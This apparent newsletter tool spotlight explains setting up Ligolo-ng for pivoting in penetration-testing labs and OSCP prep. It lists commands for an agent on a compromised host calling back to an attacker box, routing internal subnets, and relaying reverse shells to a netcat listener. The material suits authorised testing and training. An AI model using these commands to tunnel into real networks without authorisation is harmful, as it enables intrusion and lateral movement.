### Content of the Day — Tool Spotlight: Ligolo-ng

If you've ever watched `proxychains nmap` crawl through a SOCKS proxy at three ports a minute and quietly reconsidered your career, Ligolo-ng is the fix. It's a tunnelling/pivoting tool built around a **TUN interface** rather than a SOCKS proxy: the proxy runs on your attack box, the agent runs on a compromised pivot host, and instead of wrapping every tool in `proxychains`, Ligolo stands up a userland network stack (gVisor) and translates packets sent to a `tun` device onto the agent's remote network. The practical consequence is that internal subnets become *routable*. `nmap`, `evil-winrm`, `smbclient`, `nxc`, RDP, Burp — everything just works, at native speed, with no per-tool proxy config and none of the UDP/ICMP breakage that makes SOCKS miserable. Maps to **T1090.001 (Proxy: Internal Proxy)** and **T1572 (Protocol Tunneling)**.

Setup is two binaries and about four commands. On the attacker side, create and raise the interface once: `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`, then run `./proxy -selfcert` (listener defaults to 11601). Drop the agent on the pivot and call back: `./agent -connect <attacker>:11601 -ignore-cert -retry`, or `agent.exe -connect ...` on Windows. In the Ligolo console, `session` to select the agent, `ifconfig` to enumerate the pivot's interfaces, and then — crucially, from a *separate* terminal — add the route: `sudo ip route add 172.16.1.0/24 dev ligolo`. Back in the console, `start` brings the tunnel up. That's it. Scan the new subnet directly from Kali as if it were local. **Important operational detail: the agent needs no administrative privileges.** Only the proxy side needs the ability to create a `tun` device. That single property is why Ligolo beats an SSH `-D` dynamic forward on any box where you landed as a low-priv service account.

The feature that people under-use is `listener_add`, which solves the reverse-shell-from-deep-inside problem. A host two hops in has no route back to you — it can only reach the pivot. So bind a listener on the agent and have Ligolo relay it: `listener_add --addr 0.0.0.0:11111 --to 127.0.0.1:22222 --tcp`. Now anything the inner host sends to the pivot on 11111 pops out on your local 22222, and you can catch it with a plain `nc -lvnp 22222`. Same mechanism serves file transfer inbound and outbound. For reaching a service bound to `127.0.0.1` on the pivot itself, Ligolo exposes it via the magic address — route `240.0.0.1/32` down the `ligolo` interface and hit the pivot's loopback services directly. Multiple concurrent tunnels are supported: name each interface (`ligolo1`, `ligolo2`) and you can hold several pivots at once without the routing table turning into a crime scene. Ligolo-mp exists for genuinely multi-operator engagements, but for lab work `ligolo-ng` alone is the whole answer.

For OSCP specifically this is close to mandatory. The exam's AD set is built around pivoting from a compromised host into an internal segment, and the amount of time you lose fighting `proxychains` timeouts under exam pressure is not a theoretical cost. Practise it on HTB multi-network boxes and PG Play chains until the four-command setup is muscle memory — and be aware that the tool is not exam-restricted, but *do* verify the current OffSec restricted-tools list yourself before you rely on it. The wider lesson is the one Sectigo's Jason Soroko drew from the `snap-confine` bug above: least privilege isn't a property of a binary, it depends on the full sequence of operations around it. Same is true of network segmentation — a firewall rule is only as good as the assumption that nobody owns a box on both sides of it.
